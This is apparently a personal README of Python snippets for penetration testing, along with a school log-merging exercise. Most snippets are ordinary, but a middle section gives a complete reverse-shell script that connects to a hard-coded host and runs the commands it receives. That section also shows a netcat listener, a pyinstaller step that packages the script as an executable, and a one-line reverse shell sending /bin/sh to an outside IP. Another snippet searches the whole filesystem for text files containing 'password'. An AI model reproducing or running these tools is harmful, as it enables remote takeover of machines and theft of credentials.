# Introduction to Python and Case Study

> Python is a interpreted language

# Table of Contents

- [Introduction to Python and Case Study](#introduction-to-python-and-case-study)
- [Table of Contents](#table-of-contents)
- [Python Scripts](#python-scripts)
  - [linuxprivchecker.py -- a Linux Privilege Escalation Check Script](#linuxprivchecker-py-a-linux-privilege-escalation-check-script)
  - [Helper Scripts](#helper-scripts)
    - [Kali Setup](#kali-setup)
- [Snippets](#snippets)
  - [Execute Shell Commands](#execute-shell-commands)
  - [Execute Shell Commands and Get Result in Variable](#execute-shell-commands-and-get-result-in-variable)
  - [Read and Write Data to File](#read-and-write-data-to-file)
  - [Convert Python List to JSON](#convert-python-list-to-json)
  - [Convert Python List of Dictionaries to JSON](#convert-python-list-of-dictionaries-to-json)
  - [Convert Python List of Lists to JSON](#convert-python-list-of-lists-to-json)
  - [Read command line arguments (sys arg)](#read-command-line-arguments-sys-arg)
  - [Start Webserver in current Dictionary](#start-webserver-in-current-dictionary)
  - [List all .txt on Desktop](#list-all-txt-on-desktop)
  - [Print all .txt files on System](#print-all-txt-files-on-system)
  - [Print Path of all .txt which contains 'password'](#print-path-of-all-txt-which-contains-password)
  - [Own Reverse Shell Script](#own-reverse-shell-script)
    - [Open Listener on Attacker Machine and wait for a session…](#open-listener-on-attacker-machine-and-wait-for-a-session…)
    - [Create Executable (exe ? )  from Python](#create-executable-exe-from-python)
    - [Python One Line Reverse Shell](#python-one-line-reverse-shell)
- [School related exercies](#school-related-exercies)
  - [Some basic concepts in Python](#some-basic-concepts-in-python)
  - [Merge Log Files](#merge-log-files)
    - [Goal & Tasks](#goal-tasks)


# Python Scripts

## linuxprivchecker.py -- a Linux Privilege Escalation Check Script

https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py

## Helper Scripts

🚧 = Under Construction, do not use

### Kali Setup

🚧 [Kali-Setup.py](assets/Kali-Setup.py)


# Cheat Sheets

*  [Python-CheatSheet](assets/Python-CheatSheet.pdf) - From [darknetdiaries.com/links](http://darknetdiaries.com/links/)

# Snippets

## Execute Shell Commands

```import os
command = "python --version" #command to be executed
os.system(command)
```

## Execute Shell Commands and Get Result in Variable

```
command = 'grep -i "find me" ./document.txt'
result = (subprocess.check_output(command, shell=True)).decode('utf-8');
print(result)
```

## Read and Write Data to File

```import os
# Python code to
# demonstrate readlines()
  
L = ["Geeks\n", "for\n", "Geeks\n"]
  
# writing to file
file1 = open('myfile.txt', 'w')
file1.writelines(L)
file1.close()
  
# Using readlines()
file1 = open('myfile.txt', 'r')
Lines = file1.readlines()
  
count = 0
# Strips the newline character
for line in Lines:
    count += 1
    print("Line{}: {}".format(count, line.strip()))
```



## Convert Python List to JSON

```
import json

aList = [41, 58, 63]
jsonStr = json.dumps(aList)
print(jsonStr)
```

## Convert Python List of Dictionaries to JSON

```
import json

aList = [{'a':1, 'b':2}, {'c':3, 'd':4}]
jsonStr = json.dumps(aList)
print(jsonStr)
```

## Convert Python List of Lists to JSON

```
import json

aList = [[{'a':1, 'b':2}], [{'c':3, 'd':4}]]
jsonStr = json.dumps(aList)
print(jsonStr)
```


## Read command line arguments (sys arg)

> You can use sys.argv.

```
....

tsv_file = sys.argv[1]

xlsx_file = sys.argv[2]

...
```

You can run like:

`main.py sample.tsv sample.xlsx`



## Start Webserver in current Dictionary 

`sudo python3 -m http.server 88`

![-parallels@kali-linux-2021-1--[~Desktop]](assets/-parallels@kali-linux-2021-1--%5B~Desktop%5D.png)


## List all .txt on Desktop

```
import glob, os
os.chdir("/home/parallels/Desktop/")
for file in glob.glob("*.txt"):
    print(file)
```

## Print all .txt files on System

```
import os
for root, dirs, files in os.walk("/"):
    for file in files:
        if file.endswith(".txt"):
            print(os.path.join(root, file))
```
## Print Path of all .txt which contains 'password'

```
import os
for root, dirs, files in os.walk("/"):
    for file in files:
        if file.endswith(".txt"):
            with open(os.path.join(root, file)) as f:
                if 'password' in f.read():
                    print(os.path.join(root, file))
```





## Own Reverse Shell Script

```
import socket as socket
import subprocess as subprocess
import os as os

# Create a socket
def socket_create():
    try:
         global host
         global port
         global s
         host = "10.211.55.4"
         port = 9999
         s = socket.socket()
    except s.error as msg:
        print("Socket creation error: " + str(msg))


# Connect to remote socket
def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        print("Socket connection error: " + str(msg))


# Receive commands from remote server and run on local machine
def receive_commands():
    global s
    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[:3].decode("utf-8"))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
            print(output_str)
    s.close()

def main():
    socket_create()
    socket_connect()
    receive_commands()

main()
```        

### Open Listener on Attacker Machine and wait for a session…

`nc -nlvp 9999`

### Create Executable (exe ? )  from Python

`sudo pyinstaller --onefile reverseshell.py`


### Python One Line Reverse Shell

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("35.226.248.77",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```



# School related exercies


## Some basic concepts in Python

```
name = "Peter";
lastname = "Mueller";
age = 31;
salery = 10000.50;
income = salery * 12;
test = "1" + "1"
test2 = '2' + '2'
mystring = "It\'s Sunnday!!!";
l=len(mystring)
print(income);
print(income-12);
print(name + " " + lastname);
print(test)
print(test2)
print(mystring);
print(l)

door_locked = True
if door_locked:
    print("door is locked")
else:
    print("door is not locked")


i = 1
while i < 5:
    print(i)
    i = i + 1

mylist = [1, 'a', "hello", 12.15]

for item in mylist:
    print(item)


for letter in "hello":
    print(letter);

def say_name (name):
    print("hi", name)

say_name("Peter");
```


## Merge Log Files
* [access.log](assets/access.log)
* [forensics.json](assets/forensics.json)
* Solution: [merge.py](assets/merge.py)

A web application writes logs into the two separate log files access.log and forensics.json. The log data cannot be handled correctly by the in-house SIEM system. Therefore, a Python 3 program has to be developed to merge and convert the data of the two log files into a new file output.json with serialized JSON objects.
 
access.log: The web server access log contains data in a standard httpd access log format with the following fields:
* Unique Request ID
* Remote IP
* Remote Log Name (always -)
* HTTP username
* Timestamp
* Request
* Status code
* Response size

forensics.json: The forensics log file is a structured log file from the web application providing additional header data of the requests. The file contains one JSON object per line in the following format:
 
```
{"requestId":"XgwCwX8AAAEAAHE2NZoAAAAF","request":"GET /cron/vmcontrol.html?job=getList HTTP/1.1","headers":"Accept-Encoding:identity\nHost:www.hacking-lab.com\nConnection:close\nUser-Agent:Python-urllib/2.7"}
```

### Goal & Tasks

Develop a Python program which meets the following requirements:
 
* Read and parse both log files
* Match log file entries using the unique request ID
* Write a JSON object to STDOUT or into the file output.json for each identified request in the file access.log
* If you encounter an unspecified situation, write an error message to STDERR
* Convert timestamps into ISO 8601 format using the Python 3 datetime library with the format string %d/%m/%Y:%H:%M:%S %z to parse the date
* Convert headers into a dictionary of lists (e.g. {'Host': ['www.hacking-lab.com'], 'Connection': ['keep-alive'], ...})
* If a header is specified multiple times, all values should be retained in order (e.g. Header: test\nHeader: test2 results in 'Header': ['test', 'test2'])
* Each JSON object in the file output.json must consist the following structure and partially converted data.
 
```
{
  "requestId": "XgwCwX8AAAEAAHE2NZoAAAAF",
  "remoteAddress": "212.254.246.102",
  "timestamp": "2020-01-01T03:24:01+01:00",
  "method": "GET",
  "url": "/cron/vmcontrol.html?job=getList",
  "version": "HTTP/1.1"
  "responseCode": 200,
  "responseSize": 64,
  "requestHeaders": {
    "Accept-Encoding": ["identity"],
    "Host": ["www.hacking-lab.com"],
    "Connection": ["close"],
    "User-Agent": ["Python-urllib/2.7"]
  }
}
```
 
* The JSON objects in the file output.json must be separated with a newline character

